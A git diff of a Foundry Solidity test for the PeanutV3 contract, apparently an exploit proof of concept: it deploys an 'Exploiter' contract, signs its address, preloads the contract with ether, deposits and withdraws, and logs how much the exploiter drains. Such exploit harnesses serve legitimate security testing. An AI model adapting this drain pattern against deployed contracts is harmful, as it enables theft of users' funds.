@@ -4,6 +4,9 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/PeanutV3.sol";
 
+import "../src/ECDSA.sol";
+import "../src/Exploiter.sol";
+
 contract NutcrackerTest is Test {
     PeanutV3 peanutV3;
 
@@ -28,54 +31,47 @@ contract NutcrackerTest is Test {
     }
 
     function testMakeDeposit() public {
-        // address _tokenAddress,
-        // uint8 _contractType,
-        // uint256 _amount,
-        // uint256 _tokenId,
-        // address _pubKey20
-
         address _tokenAddress = address(0); // ETH
         uint8 _contractType = 0; // ether
-        uint256 _amount = 1000000000000000000; // 1 ETH
+        uint256 _amount = 1 ether;
         uint256 _tokenId = 0; // ignored when _contractType == 0
         address _pubKey20 = SIGNER_ADDRESS;
 
-        address hacker = address(0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f);
-        vm.prank(hacker);
+        // Setup Exploiter
+        Exploiter exploiter = new Exploiter(peanutV3);
+        address hacker = address(exploiter);
 
-        bytes32 hash = keccak256(abi.encodePacked(hacker));
+        // Signature
+        bytes32 hash = ECDSA.toEthSignedMessageHash(abi.encodePacked(keccak256(abi.encodePacked(hacker))));
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PRIVATE_KEY, hash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        emit log_bytes(signature);        
 
-        bytes memory signature = abi.encodePacked(v, r, s);
-        emit log_bytes(signature);
+        // Preload PeanutV3 with ether
+        vm.deal(address(peanutV3), 2 ether);
 
+        // Deposit 1 ether
         uint256 depositId = peanutV3.makeDeposit{value: _amount}(
             _tokenAddress,
             _contractType,
             _amount,
             _tokenId,
-            // _pubKey20
-            0x01d32A3567Bd95620FEF661D2B88b0F1ce1fB0e6
+            SIGNER_ADDRESS
         );
 
         emit log_named_uint("depositId", depositId);
+        uint256 initialBalance = address(hacker).balance;
+        emit log_named_uint("Balance before ", initialBalance);
 
-        bytes memory signature_original = bytes(hex"3de6a25a8707dbafa7246568fe690a04ae384aae83ab8b007ff78810974757db2e4380533352b9e42e987a20423272efc5d941b92205a93c66e9040bee551a3a1c");
-
-        emit log_named_uint("Balance ", address(0xAb45507d1db315e8618eA26D78F1C85210077792).balance);
-
-        // withdraw
+        // Withdraw
         peanutV3.withdrawDeposit(
             depositId, 
-            // hacker, 
-            0xAb45507d1db315e8618eA26D78F1C85210077792, 
-            0x677790e30694f0593afa76b03652171614f27e222783ea585f0742634eb992fb, 
-            // signature
-            signature_original
+            hacker, 
+            ECDSA.toEthSignedMessageHash(abi.encodePacked(keccak256(abi.encodePacked(hacker)))),
+            signature
         );
 
-        emit log_named_uint("Balance ", address(0xAb45507d1db315e8618eA26D78F1C85210077792).balance);
-
-
+        emit log_named_uint("Balance after ", address(hacker).balance);
+        emit log_named_uint("Withdrew ", address(hacker).balance - initialBalance);
     }
 }
